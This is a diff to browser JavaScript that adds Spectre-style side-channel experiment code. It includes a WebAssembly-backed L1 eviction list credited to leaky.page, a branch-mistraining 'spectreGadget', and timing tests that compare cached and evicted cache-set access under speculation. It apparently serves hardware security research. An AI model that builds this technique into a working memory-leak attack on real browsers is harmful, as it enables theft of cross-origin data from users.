@@ -117,7 +117,7 @@ const touch_timer = new L1Timer((trash) => probeArray[SET << 6 + trash]);
 /*
  Take the median of 100 samples and compare across the experiments.
  */
-function trial() {
+function test_architectural() {
     let control = [];
     for (let i = 0; i < 100; i++) {
         control.push(control_timer.timeCacheSet(SET));
@@ -130,6 +130,100 @@ function trial() {
 
     control.sort();
     experiment.sort();
-    console.log(`Control: ${control[control.length / 2]}, Experiment: ${experiment[experiment.length / 2]}`);
+    console.log(`Cached: ${control[control.length / 2]}, Evicted: ${experiment[experiment.length / 2]}`);
     return;
+}
+
+/* 
+ L1 eviction set code from leaky.page
+ */
+const kEndMarker = 0xffffffff;
+const kWasmPageSize = 64 * 1024;
+class EvictionList {
+    constructor(initialSize, offset) {
+        const memorySize = initialSize * PAGE_SZ;
+        this.memory = new DataView(new WebAssembly.Memory({ initial: Math.ceil(memorySize / kWasmPageSize) }).buffer);
+        this.head = offset;
+        for (let i = 0; i < initialSize - 1; i++) {
+            this.memory.setUint32(i * PAGE_SZ + offset, (i + 1) * PAGE_SZ + offset, true);
+        }
+        this.tail = (initialSize - 1) * PAGE_SZ + offset;
+        this.memory.setUint32(this.tail, kEndMarker, true);
+        this.length = initialSize;
+    }
+
+    traverse() {
+        let e = this.head;
+        while (e != kEndMarker) {
+            e = this.memory.getUint32(e, true);
+        }
+        return e;
+    }
+}
+
+// Victim for eviction is in L1 set zero. This can be probeArray[0].
+const es = new EvictionList(200, 0);
+const spectreArgs = new Uint8Array([0]);
+probeArray[0] = 15;
+
+/*
+ Callback function for PLRU with set access that happens under
+ speculation if probeArray[0] is not in the L1 cache.
+ */
+function spectreGadget(trash) {
+    // We want to access as little memory as possible to avoid false positives.
+    // Putting arguments in a global array seems to work better than passing them
+    // as parameters.
+    const idx = spectreArgs[0] | 0;
+
+    // Add a loop to control the state of the branch predictor
+    // I.e. we want the last n branches taken/not taken to be consistent
+    for (let i = 0; i < 50; i++);
+
+    // PLRU + speculation: probeArray[0] will be evicted from L1
+    return probeArray[idx < probeArray[0] ? 0x2040 : 0x400];
+}
+
+const spectreTimer = new L1Timer(spectreGadget);
+
+/*
+ Function to test PLRU under speculation. Mistrains branch predictors
+ by calling spectreGadget twice with params that make the branch true,
+ then times the third call with PLRU.
+ */
+function testBit(cond) {
+    spectreArgs[0] = 0;
+
+    for (let j = 0; j < 2; j++) {
+        spectreGadget();
+    }
+
+    // Try to evict the length field of our array from memory, so that we can
+    // speculate over the length check if the argument is true.
+    if (cond) es.traverse();
+
+    spectreArgs[0] = 31;
+
+    // In the gadget, we access cacheSet 0 if the bit was 0 and set 32 for bit 1.
+    return spectreTimer.timeCacheSet(SET);
+}
+
+/*
+ Take the median of 100 samples and compare across two experiments where
+ in one, probeArray[0] is cached in L1; in another, it is evicted from L1.
+ */
+function test_speculation() {
+    const evict_times = [];
+    for (let i = 0; i < 100; i++) {
+        evict_times.push(testBit(true));
+    }
+
+    const cached_times = [];
+    for (let i = 0; i < 100; i++) {
+        cached_times.push(testBit(false));
+    }
+
+    evict_times.sort();
+    cached_times.sort();
+    console.log(`Cached: ${cached_times[cached_times.length / 2]}, Evicted: ${evict_times[evict_times.length / 2]}`);
 }
